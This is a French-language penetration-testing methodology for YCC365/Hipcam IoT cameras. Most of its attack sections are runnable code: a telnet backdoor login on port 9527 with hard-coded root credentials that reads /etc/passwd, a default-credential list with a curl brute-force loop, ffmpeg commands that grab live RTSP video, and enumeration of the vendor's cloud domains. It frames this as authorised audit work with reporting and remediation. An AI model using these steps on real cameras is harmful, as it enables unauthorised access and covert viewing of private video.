# 📋 Méthodologie Pentest — YCC365 Ghost

> Framework de test reproductible pour audit de caméras IoT basé sur OWASP + PTES
> **Signé Ghost1o1** — Pentest & Audit IoT

---

## 🎯 Approche Générale

Ce scanner implémente **OWASP IoT Top 10** + **PTES** (Penetration Testing Execution Standard) :

```
1. Reconnaissance (passive)
2. Scanning & Enumeration (active)
3. Vulnerability Analysis
4. Exploitation
5. Post-Exploitation
6. Reporting
```

Pour les caméras YCC365/Hipcam, les phases sont adaptées :

```
Phase 0: Préparation (légale + lab)
Phase 1: Network Discovery
Phase 2: Service Enumeration
Phase 3: Auth Bypass Testing
Phase 4: RTSP Stream Access
Phase 5: Cloud Backend Mapping
Phase 6: Reporting & Remediation
```

---

## 📜 Phase 0 : Préparation (CRITIQUE)

### ⚖️ Vérifications Légales

```markdown
☐ J'ai l'autorisation ÉCRITE du propriétaire
☐ Le périmètre est clairement défini (quelle IP ? quel réseau ?)
☐ Le scope temporel est défini (créneau horaire)
☐ Je documente TOUT (logs, screenshots, timestamps)
☐ Je connais les lois applicables (CFAA, CMCA, etc.)
☐ J'ai un "abort signal" défini (mot-clé pour stopper)
```

### Script Setup

```bash
# Créer un dossier d'évidence
mkdir -p ~/audit/ycc365-$(date +%Y%m%d)
cd ~/audit/ycc365-$(date +%Y%m%d)

# Initialiser les logs horodatés
exec > >(tee -a scan_$(date +%H%M%S).log) 2>&1

# Vérifier la connectivité cible
ping -c 1 -W 2 192.168.1.100 || echo "[!] Cible injoignable"

# Capture réseau de référence
tcpdump -i eth0 -w baseline.pcap &
TCPDUMP_PID=$!
```

### Outillage

```bash
# Debian / Kali
apt install -y nmap ncat curl jq python3-pip binwalk

# Outils additionnels utiles
pip3 install websocket-client requests python-nmap

# Vérifier versions
python3 --version  # 3.10+
nmap --version      # 7.80+
```

---

## 🔍 Phase 1 : Network Discovery

### Host Discovery

```bash
# Réponse ARP dans le LAN
arp-scan --localnet

# Scan ICMP rapide
nmap -sn 192.168.1.0/24

# Scan en silence (SYN stealth) sans ACK
nmap -sS -Pn 192.168.1.0/24

# Identifier les caméras via leur signature
nmap -sS -p 34567 --open 192.168.1.0/24
```

### Service Discovery (Version Detection)

```bash
# Scan ciblé sur les ports YCC365/Hipcam
nmap -sV -p 34567,9527,554,8899,80,23,5552,37777,5000 192.168.1.100
```

**Signatures typiques** :
```
PORT     STATE SERVICE       VERSION
34567/tcp open  http          Hipcam HTTP admin
9527/tcp  open  telnet        BusyBox telnetd
554/tcp   open  rtsp          Hipcam RTSP server
8899/tcp  open  http          ONVIF device_service
80/tcp    open  http          nginx 1.10.3
5552/tcp  open  adb           Android Debug Bridge
```

---

## 🚪 Phase 2 : Service Enumeration

### HTTP Banner Grabbing

```bash
# Web admin UI
curl -v http://192.168.1.100:34567/

# Server header reveals SDK version
# Server: Hipcam/2.0
# X-Powered-By: HiSilicon
# WWW-Authenticate: Basic realm="YCC365"
```

### RTSP OPTIONS

```bash
# Discover RTSP methods
curl -X OPTIONS rtsp://192.168.1.100:554/

# Try DESCRIBE on common paths
for path in /11 /12 /live/main /h264 /Streaming/Channels/101; do
  echo "[*] $path"
  curl -X DESCRIBE -o /dev/null -w "%{http_code}" \
    rtsp://192.168.1.100:554$path
done
```

### ONVIF GetCapabilities

```bash
# Probe ONVIF endpoint
curl -X POST http://192.168.1.100:8899/onvif/device_service \
  -H "Content-Type: application/soap+xml" \
  -d '<?xml version="1.0"?>
<Envelope xmlns="http://www.w3.org/2003/05/soap-envelope">
  <Body>
    <GetCapabilities xmlns="http://www.onvif.org/ver10/device/wsdl">
      <Category>All</Category>
    </GetCapabilities>
  </Body>
</Envelope>'
```

---

## 🔐 Phase 3 : Auth Bypass Testing

### Credentials Backdoor Test

```python
# Test backdoor Telnet sur port 9527
import socket

sock = socket.socket()
sock.settimeout(5)
sock.connect(("192.168.1.100", 9527))
banner = sock.recv(1024)
sock.send(b"root\n")
sock.send(b"xmhdipc\n")
sock.send(b"cat /etc/passwd\n")
response = sock.recv(4096)
print(response.decode())  # Si le passwd file apparaît = COMPROMIS
```

### HTTP Brute Force

```bash
# Top 23 credentials Hipcam
wordlist=(
  "admin:admin"
  "admin:12345"
  "admin:888888"
  "admin:666666"
  "admin:123"
  "admin:password"
  "admin:123456"
  "admin:111111"
  "admin:000000"
  "admin:999999"
  "admin:abc123"
  "admin:admin123"
  "user:user"
  "user:12345"
  "user:password"
  "root:root"
  "root:xmhdipc"
  "root:12345"
  "root:pass"
  "support:support"
  "service:service"
  "guest:guest"
  "operator:operator"
)

for cred in "${wordlist[@]}"; do
  user="${cred%:*}"
  pass="${cred#*:}"
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -u "$user:$pass" "http://192.168.1.100:34567/")
  if [ "$code" == "200" ] || [ "$code" == "301" ]; then
    echo "[VALID] $user:$pass → HTTP $code"
  fi
done
```

---

## 📹 Phase 4 : RTSP Stream Access

### Stream Grabbing

```bash
# Méthode 1 : RTSP direct
ffmpeg -rtsp_transport tcp -i "rtsp://admin:12345@192.168.1.100:554/11" \
  -c copy output.mp4

# Méthode 2 : via URL encoding
ffmpeg -i "rtsp://192.168.1.100:554/user=admin&password=12345&channel=1&stream=0.sdp" \
  -c copy output.mp4

# Méthode 3 : sans auth
ffmpeg -i "rtsp://192.168.1.100:554/11" -c copy output.mp4
```

### Snapshot via API

```bash
# Certains firmwares ont endpoint snapshot
curl -u admin:12345 http://192.168.1.100:80/snapshot.jpg -o snap.jpg
curl -u admin:12345 http://192.168.1.100:34567/snapshot.jpg -o snap.jpg
curl -u admin:12345 http://192.168.1.100:80/web/snap.jpg -o snap.jpg
```

---

## ☁️ Phase 5 : Cloud Backend Mapping

### DNS Enumeration

```bash
# Résoudre tous les sous-domaines XMEYE
for sub in "" api cloud relay p2p p2pserver stream streaming api2 mobile update; do
  host="$sub.xmeye.net"
  ip=$(dig +short $host)
  [ -n "$ip" ] && echo "$host → $ip"
done
```

### Certificate Transparency

```bash
# Chercher tous les certs émis pour xmeye.net
# via crt.sh
curl "https://crt.sh/?q=%25.xmeye.net&output=json" | jq -r '.[].name_value' | sort -u
```

### Banner Grabbing HTTP/HTTPS

```bash
# Test connectivité + Server banner
for domain in xmeye.net ycc365.com lookcam.live; do
  echo "[*] $domain"
  curl -v -o /dev/null -D - https://$domain 2>&1 | grep -E "^(Server|HTTP|Location)"
done
```

---

## 📊 Phase 6 : Reporting

### Structure Rapport Standard

```markdown
# Audit Caméra YCC365plus — [CLIENT]
**Date** : 2026-XX-XX
**Auditeur** : Ghost1o1
**Périmètre** : 192.168.1.100 (caméra unique)

## Synthèse Exécutive
[Résumé 1 page pour management]

## Findings
| ID | Severity | Description |
|----|----------|-------------|
| VULN-001 | Critical | Telnet backdoor actif |
| VULN-002 | High | Default creds admin/12345 |
| VULN-003 | High | RTSP stream accessible sans auth |

## Détails Techniques
### VULN-001 — Backdoor Telnet port 9527
**CVSS v3.1** : 9.8 (Critical)
**CWE** : CWE-798 (Use of Hard-coded Credentials)
**CVE-Reference** : CVE-2021-32960
**Evidence** :
```
$ ncat -nv 192.168.1.100 9527
root
xmhdipc
# cat /etc/passwd
root:x:0:0:root:/root:/bin/sh
...
```

**Reproduction** : [commandes listées]
**Remediation** :
1. Mettre à jour firmware (version >= X.Y.Z)
2. Si pas de fix disponible : désactiver Telnet via interface admin
3. Bloquer port 9527 au niveau réseau

## Annexes
- Logs complets en annexe A
- PCAP capture en annexe B
- Screenshots en annexe C
```

### Format Standardisé JSON

```bash
# Le scanner génère /tmp/ycc365_<IP>_<timestamp>.json
{
  "target": "192.168.1.100",
  "timestamp": "2026-06-29T17:23:09Z",
  "duration_seconds": 42.7,
  "open_ports": [...],
  "valid_credentials": [...],
  "rtsp_paths": [...],
  "telnet_backdoor_active": true,
  "onvif_info": {...},
  "vulnerabilities": [
    {
      "id": "VULN-001",
      "title": "Telnet Backdoor Active",
      "cvss": 9.8,
      "severity": "CRITICAL",
      "cwe": "CWE-798",
      "evidence": "..."
    }
  ]
}
```

---

## 🔁 Workflow Itératif

```
┌─────────────────────────────────────────┐
│         SCOPE DEFINITION                │
└─────────────────┬───────────────────────┘
                  ▼
┌─────────────────────────────────────────┐
│         PRE-ENGAGEMENT                  │
│  • Letter of Authorization              │
│  • Rules of Engagement                  │
│  • Communication plan                   │
└─────────────────┬───────────────────────┘
                  ▼
┌─────────────────────────────────────────┐
│         RECONNAISSANCE                  │
│  • Network discovery                    │
│  • Service identification              │
└─────────────────┬───────────────────────┘
                  ▼
┌─────────────────────────────────────────┐
│         VULNERABILITY TESTING           │
│  • Auth bypass attempts                 │
│  • RTSP stream access                   │
│  • Cloud mapping                        │
└─────────────────┬───────────────────────┘
                  ▼
┌─────────────────────────────────────────┐
│         EXPLOITATION                    │
│  • Documented exploitation              │
│  • Evidence collection                  │
└─────────────────┬───────────────────────┘
                  ▼
┌─────────────────────────────────────────┐
│         POST-EXPLOITATION               │
│  • Lateral movement possibilities       │
│  • Persistence assessment              │
│  • Data exposure                        │
└─────────────────┬───────────────────────┘
                  ▼
┌─────────────────────────────────────────┐
│         REPORTING                       │
│  • Technical report                     │
│  • Executive summary                    │
│  • Remediation plan                     │
└─────────────────────────────────────────┘
```

---

## ⚠️ Erreurs Courantes à Éviter

### ❌ NE PAS FAIRE

- Scan agressif sur production (peut crasher la caméra)
- Block ICMP sur la cible (perte visibilité)
- Exfiltrer credentials sans autorisation explicite
- Modifier la configuration (perte intégrité)
- Désactiver les services de sécurité
- Utiliser des outils non maîtrisés

### ✅ BONNES PRATIQUES

- Toujours commencer par reconnaissance passive
- Documenter chaque étape avec timestamp
- Conserver les logs bruts (PCAP, console output)
- Expliquer chaque finding avec impact business
- Fournir un plan de remediation actionnable

---

## 🛠️ Script Bonus — One-Shot Audit

```bash
#!/bin/bash
# audit_ycc365.sh — Audit complet one-shot
# Usage: sudo ./audit_ycc365.sh <IP_CAMERA>

set -e

TARGET="${1:?Usage: $0 <IP>}"
DATE=$(date +%Y%m%d_%H%M%S)
OUTDIR="audit_${TARGET}_${DATE}"
mkdir -p "$OUTDIR"

# Phase 1: Network Discovery
echo "[*] Phase 1: Network Discovery..."
nmap -sV -p 34567,9527,554,8899,80,23,5552,37777,5000 \
  "$TARGET" -oN "$OUTDIR/01_nmap.txt"

# Phase 2: Service Enum
echo "[*] Phase 2: Service Enum..."
curl -v "http://$TARGET:34567/" > "$OUTDIR/02_http.txt" 2>&1

# Phase 3: Auth brute
echo "[*] Phase 3: Auth brute..."
python3 -m scanner.core "$TARGET" \
  --json > "$OUTDIR/03_scan.json" 2>&1

# Phase 4-5-6
python3 -m scanner.usernames "$TARGET"
python3 -m scanner.cloudmapper "$TARGET"

# Final: Aggregate report
echo "[*] Generating report..."
python3 -c "
import json, glob
results = {}
for f in glob.glob('$OUTDIR/*.json'):
    with open(f) as fp:
        results[f] = json.load(fp)

print(json.dumps(results, indent=2))
" > "$OUTDIR/REPORT.json"

echo "[+] Audit terminé : $OUTDIR/"
ls -la "$OUTDIR"
```

---

## 📚 Références

- **OWASP IoT Top 10** : https://owasp.org/www-project-internet-of-things/
- **PTES** : http://www.pentest-standard.org/
- **NIST SP 800-115** : Technical Guide to Information Security Testing
- **CWE** : https://cwe.mitre.org/

---

**Signé Ghost1o1** 🏴‍☠️ — *La méthode, c'est la discipline du guerrier*
